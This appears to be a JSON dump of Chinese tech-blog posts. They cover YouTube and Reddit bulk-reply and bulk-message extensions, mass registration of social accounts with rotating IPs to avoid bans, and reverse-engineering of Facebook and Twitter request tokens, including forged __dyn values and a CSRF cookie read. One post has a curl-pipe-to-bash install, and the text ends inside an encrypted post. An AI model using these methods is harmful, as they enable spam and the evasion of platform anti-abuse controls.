Raz1ner! How are you today? 设置的内容 Hello @@@!\\nHow are you today? YouTube 工作室后台回复 在 YouTube 工作室的评论界面刷新后会显示出「自动回复」的按钮。点击按钮开始运行。 在运行的过程中会显示评论和点红心的数量。 如果这个帖子是社区帖，会优先选择回复内容中包含链接的内容进行回复。当一个用户回复一次后，就不会再回复了，只会点红心。 社区帖回复 打开社区帖界面，刷新后会显示「自动回复」按钮。点击按钮开始运行。 然后，页面会自动向下滚动加载评论数据。加载完成后，页面将自动复位，并开始自动回复。如果用户已回复或点过红心，将直接跳过，不再回复。 常见问题解答 点击「自动回复」按钮后没有任何反应。 按照以下步骤排查： 检查插件设置是否设置正确。 表格链接格式是否设置正确。 表格链接的尾缀应当是包含 gid 的格式，例如： /edit#gid=xxxx 如果是 /edit?usp=sharing 这种格式的链接是不支持的。 检查表格是否设置「编辑者」的权限。 将 YouTube 账号登出后重新登陆。 自动回复的 emoji 分别代表什么意思 💬 - 回复评论 ❤️ - 点红心 👤 - 拉黑或者重复跳过 为什么有的有评论，有的没有评论？ 检查设置里的评论是否包含空行，如果有空行需要删除。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"YouTube 自动回复","feature":"https://dev-coco.github.io/post-images/YouTube-Automatic-Reply.png","link":"https://dev-coco.github.io/post/YouTube-Automatic-Reply/","stats":{"text":"3 min read","time":128000,"words":622,"minutes":3},"date":"2023-12-14 07:32:24","dateFormat":"2023-12-14"},{"content":"快速大量注册社交平台的方法。 使用方法 点击下方对应社交平台的超链接，然后按照步骤注册即可，操作方法和手机上的软件一样。 注册完成后要记得备份好帐号和密码以及相关的资料，避免资料丢失无法找回帐号。 清理 Cookies 后记录就会消失。 Facebook Instagram TikTok WhatsApp YouTube 原理介绍 这是一个提供云服务的平台，它允许用户在网页上使用移动端的 Apps，而不需要下载任何软件。 它的原理是在服务器上运行移动端的软件，然后将软件的视频和音频传输到用户的网页浏览器，这样用户就可以在网页上使用这些软件，就像在手机模拟器使用软件一样的效果。 经过测试，每次清理完缓存后都会更换新的 IP 地址以及 User-Agent，这样就不用担心在同一个 IP 大量注册帐号导致被秒封的情况了。 第一次使用的 IP 地址。 清理缓存后再次使用的 IP 地址。 使用的 User-Agent 几乎都是安卓客户端。 ","tags":[{"index":-1,"name":"Instagram","slug":"instagram","used":true,"link":"https://dev-coco.github.io/tag/instagram/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"快速大量注册社交平台","feature":"https://dev-coco.github.io/post-images/Register-Social-Apps.png","link":"https://dev-coco.github.io/post/Register-Social-Apps/","stats":{"text":"2 min read","time":64000,"words":308,"minutes":2},"date":"2023-12-12 23:05:51","dateFormat":"2023-12-12"},{"content":"免费在线使用 GPT-4，无需 API Key，支持上下文。 工具链接：Free GPT-4 Online 使用方法 在下面的输入框输入消息，点击「发送」按钮发送。输入框的内容可以换行，使用「Shift + Enter」快捷键可以直接发送。 工具栏 工具栏在右上角，下面会从左到右介绍每个工具栏的功能。 重试 点击 按钮后会将最后一条消息重新发送。 Prompt 菜单 点击 按钮后会在底部显示 Prompt 菜单界面，再次点击隐藏。 点击菜单后会预设到下方的输入框。 重新开始 点击 按钮会清空所有对话记录重新开始一个新的对话。 设置 点击 按钮会打开设置界面。 随机性默认是 0.5，用来控制模型生成文本的随机性，较高的随机性生成的结果拥有更有创意的文本，适合写作、写故事等等。较低的随机性生成的结果更保守，适合用于回答某些问题，提供一些事实。 附带历史消息数默认是 5，会从对话列表中获取倒数 5 条消息用来联系上下文。 相关推荐： 免费使用 GPT-4 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"免费在线使用 GPT-4 | Free GPT-4 Online","feature":"https://dev-coco.github.io/post-images/Free-GPT-4-Online.png","link":"https://dev-coco.github.io/post/Free-GPT-4-Online/","stats":{"text":"2 min read","time":67000,"words":321,"minutes":2},"date":"2023-12-06 07:01:18","dateFormat":"2023-12-06"},{"content":"在 Instagram 上被禁止推送的标签。 什么是被禁止的标签 在 Instagram 上使用相关主题的标签可以提高帖文的推送幅度，展示给更多的用户。但并不是所有的标签都适用，有的标签使用后会降低帖子的推送幅度。如果错误的使用标签，有可能会导致 Instagram 账号被 Shadowban。 被禁止的标签特征 在标签页面不会显示帖子总数。 无法正常访问标签页面。 在标签页面会显示帖子总数，也可以正常访问标签页面，但是帖子里包含此标签后，将会被降低推送幅度。 导致标签被禁止的原因 标签内的帖子包含大量色情内容或性暗示内容，这些内容违反了 Instagram 的社群守则。 标签被机器人或大量垃圾信息的帖子覆盖。例如恶意批量发布帖子，帖子内包含大量的标签。 在线检测工具 工具链接：Instagram 屏蔽标签 输入包含标签的内容，然后点击「检测内容」，会自动检测内容中的标签是否包含了被禁止的标签。 ","tags":[{"index":-1,"name":"Instagram","slug":"instagram","used":true,"link":"https://dev-coco.github.io/tag/instagram/"}],"title":"Instagram 被禁止的标签","feature":"https://dev-coco.github.io/post-images/Instagram-Banned-Hashtags.png","link":"https://dev-coco.github.io/post/Instagram-Banned-Hashtags/","stats":{"text":"2 min read","time":62000,"words":309,"minutes":2},"date":"2023-12-02 05:38:28","dateFormat":"2023-12-02"},{"content":"这是一个封装成 Google Apps Script 的接口。 使用方法 添加脚本库 在 Google Apps Script 中添加脚本库。 输入下面的脚本 ID。 1jmPN2-P5nCMa0necWZmbksxEigMdPiwbD4z2rnX_LCNLLmvO16WN96Nc 点击「查询」后，再点击「添加」。 使用参数 使用 GPT.chat 就可以调用这个函数来使用了。第一个参数放入需要询问的文本。 const freeGPT = () =&gt; { const result = GPT.chat('你是GPT-4吗?') Logger.log(result) } 下面是返回结果。 第二个参数是温度值，0 到 1 之间，支持小数，必须是数值格式。非必填项，默认值 0.5。 温度值用来控制模型生成文本的随机性，较高的温度值生成的结果拥有更有创意的文本，适合写作、写故事等等。较低的温度值生成的结果更保守，适合用于回答某些问题，提供一些事实。 例子： GPT.chat('你是GPT-4吗?', 0.2) ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"},{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"免费使用 GPT-4","feature":"https://dev-coco.github.io/post-images/freeGPT-4.png","link":"https://dev-coco.github.io/post/freeGPT-4/","stats":{"text":"1 min read","time":51000,"words":230,"minutes":1},"date":"2023-11-30 19:59:28","dateFormat":"2023-11-30"},{"content":"非常全面的 Facebook 平台政策，实时更新，掌握最新动态。 .table {border:0;display:block;margin:0 auto} Facebook 社群守则 Meta 如何改进工作 方案 检测违规内容 采取措施 监督委员会 安全保障 季度报告 了解更多： Facebook 账号解封 Facebook 演算法 2023 最新 ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 政策大全 | 实时更新","feature":"https://dev-coco.github.io/post-images/Facebook-Real-Time-Policy.png","link":"https://dev-coco.github.io/post/Facebook-Real-Time-Policy/","stats":{"text":"1 min read","time":18000,"words":81,"minutes":1},"date":"2023-11-30 14:30:01","dateFormat":"2023-11-30"},{"content":"1.1.1.1 WARP 各项功能使用教程 iOS 版。 在 App Store 搜索「1111」就可以找到客户端。 添加配置文件 第一次使用的时候，会提示「安装 VPN 配置文件」。 点击「允许」。 基本功能 打开开关就可以启用功能。点击右上角的设置图标，会显示更多设置。 可以选择「1.1.1.1」或者「WARP+」。 1.1.1.1 这是 Cloudflare 提供的一个公共 DNS 服务，但不会改变 IP 地址。用于将域名转换为与之相关联的 IP 地址，使设备能够连接到互联网上的特定网站或服务。 WARP+ 除了提供更快 DNS 解析外，额外提供了 VPN 功能。不可自选 VPN 的区域，会自动选择一个和当前 IP 地址附近的节点。每次启动此功能的时候 IP 地址可能会变动，不是固定的节点。 高级设置 点击「高级」会显示更多的功能选项。 连接选项 对蜂窝网络禁用：开启后如果使用的是蜂窝网络会暂停功能。 对 Wi-Fi 网络禁用：开启后如果使用的是 Wi-Fi 会暂停功能。 添加 Wi-Fi 网络：可以设置指定的 Wi-Fi 名称。当连接了设置好的 Wi-Fi 名称，会暂停功能。 DNS 设置 1.1.1.1 家庭版：Cloudflare 提供的一种家庭安全服务，可以选择屏蔽恶意软件和成人内容。 协议选项：DNS 协议，可选 WARP、HTTPS 或 TLS，默认是 WARP 协议。 本地域名回退 本地域名回退功能允许忽略指定域名后缀列表的 DNS 请求。这些 DNS 请求将被传递回设备上已配置的网络接口上的 DNS 服务器。设置的方法和「排除路由」功能一样。 排除路由 这是 VPN 分流功能，可以排除指定的 IP 地址或者域名。排除的 IP 地址或域名将会使用真实 IP 地址访问。 点击「输入排除的 IP/主机」可以添加 IP 地址或域名。 诊断 DNS 日志 启用功能后，开启「DNS 日志」功能，会会自动记录访问的信息。 相关推荐： 1.1.1.1 WARP 领取 24BP 流量 ","tags":[{"name":"iOS","slug":"ios","used":true,"link":"https://dev-coco.github.io/tag/ios/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"1.1.1.1 WARP 使用教程 iOS 版","feature":"https://dev-coco.github.io/post-images/1111-Free-Data.png","link":"https://dev-coco.github.io/post/1111-iOS-Tutorial/","stats":{"text":"3 min read","time":125000,"words":570,"minutes":3},"date":"2023-11-29 07:53:20","dateFormat":"2023-11-29"},{"content":"Reddit 批量发送消息 Chrome 插件使用方法。 插件下载：Chrome 插件合集 功能 批量发送消息给指定用户。 获取用户近期活跃时间。 复制帖子评论的用户和内容。 使用方法 点击插件后，会自动打开发送消息的页面，点击左上角的 Chats 切换功能界面。 群发消息 第一次使用需要先设置发送的内容，对插件点击右键，选项，进行设置。 第一个是延迟时间，也就是每次发消息间隔的时间，秒为单位。 第二个是发送给用户的内容。在内容中使用「@@@」，在发送的时候会替换成对方的用户名。如果需要内容需要换行，使用「\\n」代替。 下面是一个例子 需要发送的内容 Hello Raz1ner! How are you today? 设置的内容 Hello @@@!\\nHow are you today? 在功能界面左侧放入用户主页的链接，点击「群发消息」，在右侧会输出发送消息的情况。 检测活跃时间 在功能界面左侧放入用户主页的链接，点击「检测活跃时间」，在右侧第一个是 karma 分数，后面会输出最多近 10 个发帖或者评论的时间。 因为是横向排列的，所以可以粘贴到 Excel 中预览。 复制评论 在 Reddit 帖子页面刷新后，右侧会显示「复制评论」的按钮，点击后会复制当前帖文评论的用户名、用户链接、评论时间、评论内容、Upvote 数量和当前帖子链接。 可以将复制的结果粘贴到 Excel 中。 检测是否回复 在功能界面左侧放入用户主页的链接，第一次使用的时候先在左侧的聊天列表滚动，插件会自动记录显示过的用户名称和内容，然后点击「检测是否回复」，会自动识别出对方是否回复过消息。 这个是根据插件里面设置的群发消息的聊天内容判断的，如果最后一次的消息和群发消息的聊天内容里面一致，就代表对方没有回复过消息。 获取帖文数据 在功能界面左侧放入帖文链接，点击「获取帖文数据」，在右侧会输出 upvote 和评论的数量。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Reddit 批量发送消息","feature":"https://dev-coco.github.io/post-images/Reddit-Bulk-Message-Sender.png","link":"https://dev-coco.github.io/post/Reddit-Bulk-Message-Sender/","stats":{"text":"3 min read","time":124000,"words":600,"minutes":3},"date":"2023-11-26 10:23:22","dateFormat":"2023-11-26"},{"content":"1.1.1.1 WARP 各项功能使用教程 macOS 版。 下载客户端：https://1.1.1.1/ 基本功能 启动后在菜单栏点击图标会显示出功能的界面。点击右上角齿轮的图标可以选择「1.1.1.1」或者「1.1.1.1 with WARP」。 1.1.1.1 这是 Cloudflare 提供的一个公共 DNS 服务，但不会改变 IP 地址。用于将域名转换为与之相关联的 IP 地址，使设备能够连接到互联网上的特定网站或服务。 1.1.1.1 with WARP 除了提供更快 DNS 解析外，额外提供了 VPN 功能。不可自选 VPN 的区域，会自动选择一个和当前 IP 地址附近的节点。每次启动此功能的时候 IP 地址可能会变动，不是固定的节点。 偏好设置设置 点击菜单栏的图标，点击「Preferences」可以查看进阶设置。 General 在这个界面可以看到当前的连接状态和公网 IP 等信息。如果需要在开机后启动可以勾选「Login at login」。 Connection 在这里可以设置指定的 Wi-Fi 名称。当连接了设置好的 Wi-Fi 名称，会暂停功能。 Disable for all Wi-Fi networks：勾选后，连接任何 Wi-Fi 都将暂停功能。 Disable for all wired networks：勾选后，连接任何有线网络都将暂停功能。 DNS Protocol：DNS 协议，可选 WARP、HTTPS 或 TLS，默认是 WARP 协议。 1.1.1.1 for Families：Cloudflare 提供的一种家庭安全服务，可以选屏蔽恶意网站和成人内容。 DNS Logs 勾选 「Log DNS queries」 后，当开启「1.1.1.1」或「1.1.1.1 for WARP」后会自动记录访问的信息。 Advanced 进阶设置。 Split Tunnel 这是 VPN 分流功能，可以排除指定的 IP 地址或者域名。排除的 IP 地址或域名将会使用真实 IP 地址访问。 点击左下角的加号，在 Excluded Host 输入排除的 IP 地址或者域名，在 Description 中输入备注，非必填项，然后点击「Done」保存。 Local Domain Fallback 本地域名回退功能允许忽略指定域名后缀列表的 DNS 请求。这些 DNS 请求将被传递回设备上已配置的网络接口上的 DNS 服务器。设置的方法和「Split Tunnel」功能一样。 Configure Proxy 配置代理功能允许设备启用本地代理服务器。通过 localhost:{端口} 发送的所有流量都将使用安全的 WARP 分流连接进行加密。 勾选「Enable proxy mode on this device」后，在「Proxy Listener Port (0-65535)」中设置端口号。 相关推荐： 1.1.1.1 WARP 领取 24BP 流量 VPN Kill Switch ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"1.1.1.1 WARP 使用教程 macOS 版","feature":"https://dev-coco.github.io/post-images/1111-Free-Data.png","link":"https://dev-coco.github.io/post/1111-macOS-Tutorial/","stats":{"text":"3 min read","time":159000,"words":677,"minutes":3},"date":"2023-11-25 07:44:29","dateFormat":"2023-11-25"},{"content":"任意 VPN 都通用的 Kill Switch 功能。 什么是 Kill Switch 在使用 VPN 的时候，所有的网络流量都经过 VPN 的服务器，以加密传输保护数据。然而，有时候 VPN 连接可能会异常或者中断，这样会导致暴露真实的 IP 地址。 Kill Switch 的作用是防止这种情况发生。它是一种自动化的安全机制，一旦检测到 VPN 连接断开，就会阻止网络连接，以防止真实 IP 地址泄露。这可以防止不安全的网络连接，确保所有的流量都通过 VPN 连接。 安装 这个程序适用于 macOS (Mac OS X &gt;= 10.6) 使用终端的 brew 安装 killswitch 命令。 brew install killswitch 如果之前没有安装过 Homebrew，需要先使用下面的方法在终端安装 brew。 /bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 使用方法 启用 开启 VPN 后输入下面的命令。 sudo killswitch -e 显示下图中的结果就代表启用成功了。 如果出现开启后无法联网的情况，关闭再打开 VPN 就可以正常使用了。 开启 Kill Switch 后，关闭 VPN 或者意外断开连接就会无法联网。 禁用 输入下面的命令关闭 Kill Switch 功能。 sudo killswitch -d 显示下图中的结果就代表已经关闭了。 ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"Shell","slug":"shell","used":true,"link":"https://dev-coco.github.io/tag/shell/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"VPN Kill Switch","feature":"https://dev-coco.github.io/post-images/VPN-Kill-Switch.png","link":"https://dev-coco.github.io/post/vpn-kill-switch/","stats":{"text":"2 min read","time":79000,"words":349,"minutes":2},"date":"2023-11-23 23:51:15","dateFormat":"2023-11-23"},{"content":"fb_dtsg 是 Facebook 动态令牌（Dynamic Token for Security Graph），是一种安全机制，用于防止跨站请求伪造（CSRF）攻击。 全局搜索 dtsg 找到了 DTSG 这个模块，可以获取到 fb_dtsg 的结果，这个结果是由 DTSGInitialData 模块写入的，但是并没有找到 DTSGInitialData 这个模块赋值的方式。 通过下面的两种方式都可以获取到 fb_dtsg，在不刷新页面的情况下，这个值是固定的。 require('DTSG').getToken() require('DTSGInitialData').token 切换到手机版页面再去全局搜索 dtsg 的时候，在 DTSG 这个模块里面有一个 refresh 更新的方法，调用的是 TokenFetcher 这个模块。 在 TokenFetcher 模块中，会向 /ajax/dtsg/ 域名发送一个请求，这个应该是就是获取 dtsg 的方法了。 使用 fetch 重写一个请求，代码如下： await fetch('https://www.facebook.com/ajax/dtsg/?__a=true') .then(response =&gt; response.text()) .then(text =&gt; JSON.parse(text.replace('for (;;);', '')).payload.token) 这种方法在每次请求的时候都会生成一个新的 fb_dtsg 参数，这样即使在不刷新页面的情况下也可以更新 fb_dtsg 的值。 相关代码：Facebook-API-Params-Generator ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"逆向 Facebook 接口 fb_dtsg 参数","feature":"https://dev-coco.github.io/post-images/Reverse-Facebook-fb_dtsg-Param.png","link":"https://dev-coco.github.io/post/Reverse-Facebook-fb_dtsg-Param/","stats":{"text":"2 min read","time":68000,"words":288,"minutes":2},"date":"2023-11-15 10:45:14","dateFormat":"2023-11-15"},{"content":"__csr 代表 Cross-Site Request，通常用于跨站点请求。 在请求接口的参数中，会看到一个叫做 __csr 的参数。 全局搜索的时候，找到一个 StaticSiteData 模块，__csr 对应的键名是 csr_key。 这里找到了 csr_key 的赋值方式 d(&quot;CSRBitMap&quot;).toCompressedString() 把开头的 d 换成 require 调用 CSRBitMap 模块就能获取到 __csr 参数的结果了。 直接定位到 CSRBitMap 模块，分析一下是怎么实现的。这里的 h 变量是一个空数组，通过 a 函数将内容写入到 h 变量中，但是目前不知道 a 传入的是什么内容，所以在这里添加断点，然后刷新页面看看传入的是什么参数。 这里显示 a 传入了一个数字 16。点击右侧 「Call Stack」 中的 「handlePayload」继续往下跟踪。 刚才传入的数字 16 是从 csrUpgrade 这里来的，那么下次传入的结果就会是 1, 8, 73... 以此类推。 在页面上搜索 csrUpgrade 就找到来源了，使用下面的代码就可以获取到这段 csrUpgrade 并且格式化数组。 document.head.outerHTML.match(/(?&lt;=csrUpgrade&quot;:&quot;:).*?(?=&quot;)/g).join(',').split(',') 那么跟着断点往下分析，传入这段 csrUpgrade 数据后 a 又传入了 303。点击右侧 「Call Stack」 中的 「U」继续往下跟踪。 刚才传入的数字 303 是从一个 css 中满足 c == 2 这个条件的 p 属性这里来的。 使用下面的代码就可以从 css 中过滤出 c 等于 2 的 p 属性的结果，并且格式化成数组。 document.body.outerHTML.match(/(?&lt;=type&quot;:&quot;css&quot;,&quot;src&quot;:&quot;https.*?&quot;,&quot;c&quot;:2,&quot;p&quot;:&quot;:).*?(?=&quot;)/g).join(',').split(',') 后面的分析方法类似，就不细节说明了，直接看结果。 这段 css 传入后，又传入了一段 csrUpgrade。不过这次是从 body 中获取到的。使用下面的代码就可以获取到这段 csrUpgrade 并且格式化数组。 document.body.outerHTML.match(/(?&lt;=csrUpgrade&quot;:&quot;:).*?(?=&quot;)/g).join(',').split(',') 这里基本上可以得出是通过网页 head 和 body 中的 csrUpgrade 和 css 中 c 等于 2 的 p 属性通过 toCompressedString 生成出来的。toCompressedString 的实现方法参考：逆向 Facebook 接口 __dyn 参数 相关代码：Facebook-API-Params-Generator ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"逆向 Facebook 接口 __csr 参数","feature":"https://dev-coco.github.io/post-images/Reverse-Facebook-__csr-Param.png","link":"https://dev-coco.github.io/post/Reverse-Facebook-__csr-Param/","stats":{"text":"3 min read","time":135000,"words":570,"minutes":3},"date":"2023-11-15 02:12:28","dateFormat":"2023-11-15"},{"content":"逆向 Twitter 接口参数。 在请求推特接口的时候，在 headers 里面有两个必须的参数，一个是 authorization，另外一个是 x-csrf-token。 authorization authorization 这个参数的值有一个特征，前面是由很多个 A 开头的，先来搜索一下看看有没有什么线索。 在这个文件里面找到了 authorization 参数对应的值，但是这里的代码是用 webpack 打包的，没办法获取到代码内部的变量值。 不过可以请求这个 js 文件，然后把代码里面的值给筛选出来。 const authorization = await fetch('https://abs.twimg.com/responsive-web/client-web/main.e6b82e4a.js').then(response =&gt; response.text()).then(text =&gt; text.match(/Bearer AAAAAAAAAAA.*?(?=&quot;)/)[0]) console.log(authorization) 这里就获取到了 authorization 的值，但是这样的方法还有一个问题，main 后面的 e6b82e4a 看起来是一个随机值，如果哪天改动了，就会失效。那么再进一步分析看看还有没有什么特征可以获取到这个文件。 这个文件的命名格式是 main 开头然后 xxxx 结尾，在整个 HTML 里面的 head 里面只有一个名字包含 main 的 js 文件。这样就简单了，只需要循环一遍页面上所有的 link 标签，然后找到包含 main 的文件即可。 let authorization const link = document.querySelectorAll('link') for (const x of link) if (x.href.includes('main')) authorization = await fetch(x.href).then(response =&gt; response.text()).then(text =&gt; text.match(/Bearer AAAAAAAAAAA.*?(?=&quot;)/)[0]) console.log(authorization) CSRF token CSRF token 的值并没有看到有什么特征，那么就先搜索一下试试看。 在这个地方可以看到 CSRF token 的赋值方式。 从这里可以看到 x-csrf-token 参数的值是从 r.vlaue 赋值的，r 的值是从 self.cookieStore.get(&quot;ct0&quot;) 传入的，这样就获取到 CSRF token 的值了。 await cookieStore.get('ct0').then(r =&gt; r.value) ","tags":[{"index":-1,"name":"Twitter (X)","slug":"twitter-x","used":true,"link":"https://dev-coco.github.io/tag/twitter-x/"}],"title":"逆向 Twitter 接口 authorization 和 CSRF token","feature":"https://dev-coco.github.io/post-images/Reverse-Twitter-Authorization-CSRF-Token-Param.png","link":"https://dev-coco.github.io/post/Reverse-Twitter-Authorization-CSRF-Token-Param/","stats":{"text":"2 min read","time":115000,"words":468,"minutes":2},"date":"2023-10-15 08:43:11","dateFormat":"2023-10-15"},{"content":"__dyn 是一个动态数据，包含一些关于页面状态的信息。 在请求接口的参数中，会看到一个叫做 __dyn 的参数。 先全局搜索一下，看看会有什么结果。 这里找到一个 StaticSiteData 模块，建立了一个对象，__dyn 对应的键名是 jsmod_key。再根据找到的结果再搜索看看有没有其它的线索。 这里找到了 jsmod_key 的赋值方式 c(&quot;ServerJSDefine&quot;).getLoadedModuleHash() 把开头的 c 换成 require，尝试在 Console 调用一下 ServerJSDefine 模块，实验一下结果是否和 __dyn 参数一致。 看起来找对地方了，接下来再看看 · 这个函数是怎么实现的。 getLoadedModuleHash 这里面又调用了 toCompressedString 函数，那么再接着往下找，看看这个函数是怎么实现的。 这里就找到了 toCompressedString 的实现方法。 不过看起来都是从 $1 这个变量里面的内容进行计算，但是这里并没有提供什么内容，是一个空数组。 function a () { this.$1 = [], this.$2 = null } 不过我在网页的模块里面找到了模块的标识或者索引，例如截图里的例子 IntlCurrentLocale: 5954 CookieDomain: 6421 JSSelfProfilerTrackedInteractions: 6918 CurrentAdAccountInitialData: 6828 只需要筛选出每个模块的标识或者索引就可以了，有可能会在 body 里面，也有可能会在 head 里面，所以合并成一个数组 const bodyData = document.body.innerHTML.match(/\\},([0-9])+\\]/gi) const headData = document.head.innerHTML.match(/\\},([0-9])+\\]/gi) const combinedData = bodyData.concat(headData) const arr = [] for (const item in combinedData) { if (combinedData[item] != null) { const extractedNumber = combinedData[item].replace(/\\},|]/g, '') if (parseInt(extractedNumber) &gt;= 7) { arr.push(parseInt(extractedNumber)) } } } 然后再遍历 数组 中的每个数字，将 bitMap 中对应索引的位置设置为 1，表示该数字存在于 数组中。这样，bitMap 就成为了一个简单的表示数字存在性的位图。后续的压缩过程利用了这个 bitMap 来计算连续相同值的数量。 const bitMap = [] for (const item in arr) { bitMap[arr[item]] = 1 } 将刚才写入的 `bitMap` 数组压缩数据，并且转换成文本值的二进制数据。 ```Javascript const compressedBits = [] let count = 1 let currentBit = bitMap[0] || 0 const currentBitString = currentBit.toString(2) for (let i = 1; i &lt; bitMap.length; i++) { const nextBit = bitMap[i] || 0 if (nextBit === currentBit) { count++ } else { compressedBits.push(convertToBinaryString(count)) currentBit = nextBit count = 1 } } 最后再将二进制转换成 base64 结果就出来了。 function convertToBase64String (binaryString) { const list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_' const sixBitChunks = (binaryString + '00000').match(/[01]{6}/g) let base64String = '' for (let i = 0; i &lt; sixBitChunks.length; i++) { base64String += list[parseInt(sixBitChunks[i], 2)] } return base64String } 和 getLoadedModuleHash 对比后结果是一致的，那么 __dyn 的参数就已经还原出来了。 在开头收集模块的标识或者索引的时候，这个数据也可以随机生成伪造参数。经过我的测试发现这个数据的长度大概在 115 到 265 之间，而且是大于 7 的，那么就可以根据下面的代码随机生成一段数据 const arr = [] const count = Math.floor(Math.random() * (265 - 115 + 1)) + 115 const allNumbers = Array.from({ length: 7331 - 7 + 1 }, (_, i) =&gt; i + 7) for (let i = 0; i &lt; count; i++) { const randomIndex = Math.floor(Math.random() * allNumbers.length) const randomNumber = allNumbers[randomIndex] arr.push(randomNumber) allNumbers.splice(randomIndex, 1) } 相关代码：Facebook-API-Params-Generator ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"逆向 Facebook 接口 __dyn 参数","feature":"https://dev-coco.github.io/post-images/Reverse-Facebook-__dyn-Param.png","link":"https://dev-coco.github.io/post/Reverse-Facebook-__dyn-Param/","stats":{"text":"4 min read","time":198000,"words":783,"minutes":4},"date":"2023-09-30 22:26:37","dateFormat":"2023-09-30"},{"content":"Claude 几乎可以平替 ChatGPT 3.5 的一个 AI 工具。 注册链接：Claude 注册方法 可以直接使用 Google 账号，或者使用邮箱注册。下面介绍的是使用邮箱注册的方法。输入邮箱后，点击「Continue with email」。 然后会发送一个登陆验证码到邮箱，输入验证码后点击「Continue with login code」。后续每次登陆都需要通过邮箱接收一个登陆验证码才可以登陆。 然后设置一个用户名，确认年龄 18+，并且同意政策后点击「Continue」继续。 第一次登陆会显示下面的界面，按照步骤点击「Next」即可。 到下图的界面后就可以使用了，支持上传文件配合提示语输出结果。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Anthropic Claude 注册方法","feature":"https://dev-coco.github.io/post-images/Claude-Register.png","link":"https://dev-coco.github.io/post/Claude-Register/","stats":{"text":"1 min read","time":42000,"words":197,"minutes":1},"date":"2023-07-14 11:39:12","dateFormat":"2023-07-14"},{"content":"每天都可以增长 YouTube 订阅人数。 staticrypt-form{background:#fff;max-width:360px;margin:0 auto;padding:45px;text-align:center;box-shadow:0 0 20px 0 rgba(0,0,0,.2),0 5px 5px 0 rgba(0,0,0,.24)}.staticrypt-form input{background:#f2f2f2;width:100%;margin:0 0 15px;padding:15px;box-sizing:border-box;font-size:14px}.staticrypt-form .staticrypt-decrypt-button{background:#4caf50;width:100%;padding:15px;color:#fff;font-size:14px} 请输入密码后查看 var a=256,b=1e3;function c(c,d){var e=CryptoJS.enc.Hex.parse(c.substr(0,32)),f=CryptoJS.enc.Hex.parse(c.substr(32,32)),g=c.substring(64),h=CryptoJS.PBKDF2(d,e,{keySize:a/32,iterations:b}),i=CryptoJS.AES.decrypt(g,h,{iv:f,padding:CryptoJS.pad.Pkcs7,mode:CryptoJS.mode.CBC}).toString(CryptoJS.enc.Utf8);return i}document.getElementById(\"staticrypt-form\").addEventListener(\"submit\",function(e){e.preventDefault();var a=document.getElementById(\"staticrypt-password\").value,b=\"268d3cc67483540f5854d72005a6b2a17d424a74cd382528e9d2e31d7243a535c7d0e422a68c092da46638bc56e1c1f1462c07112c2eb20097925fb2c79447baLc4mTY56DME5FQPj/ewguDe8zNQaVwf5812uEQmkBxOFF4VBqst2RHk2fdcO70NIufPR0l0MwO4l85MweyvRKIsEb0OGc9oQy2CE0tU2I7xlyCYzYbras+mrmfjU+7cWEf1GD80stJ2cIUBnA8HYGz2yHfO7S75Q7TfiB9JQ3kPtdX0xG4rTLbWGxXsoQilyuD1/c7q8EjCWsPWGgvv+OtvGg91dNJQcKvS9RjT7j7JLy28Gg2h6hr963zWTJXk/Ey3fO0EEJ1oobjz+xYRjiuaBtBD2yWME5bkwCfeif55DauePYE+1eZW5rd9GmiDIiOHxd7EZeUUQsmugA4CJh43wZ28SqGf1mcwGbMfIm/V8i6BjDcCsCdmNZXCArxdDtaytHFzLdoBewHrOSONJ/Ci8wkZvw8daiLbZ3kGlH5+30LEVEUqzFWXrBjOfRjGJ7RNE+Rrla4RhmY1/SWEIh9kBpx5t8/hmrMR/zgN4kNYoox93lO7NPhd9fSOZndbOhlokpdy232nsWNKuZJRTSwFNYFpXIOhkTtACqTZVFEKTbARWFtPPJHE7TiyNPGV80odYWEYB2JCRU0jdn7ztp/kA3/kqRZzgPQKZUtErSgW6Fzj+KPzqrvaO26rk8hMB0DcDeLvqwzxFb4GceZ7OLNinOYqKqSY04AGgJDlglO29w9tCGXB2S/heVE4fDVsbc7+Fs+xrkgnf/ARoGotdGtV6m+VIr2DgG1QF9jl1ytnhdIG+yF7rQBoWoLhjqrpJm3A4QYz83fVcZy3JOCnzdX5YZMdZ1qr8ti9FOS4KeDkfZGA8rv0YGsgROpAErBAUpvI2wk1RBpkULJiLtLVxt+OAT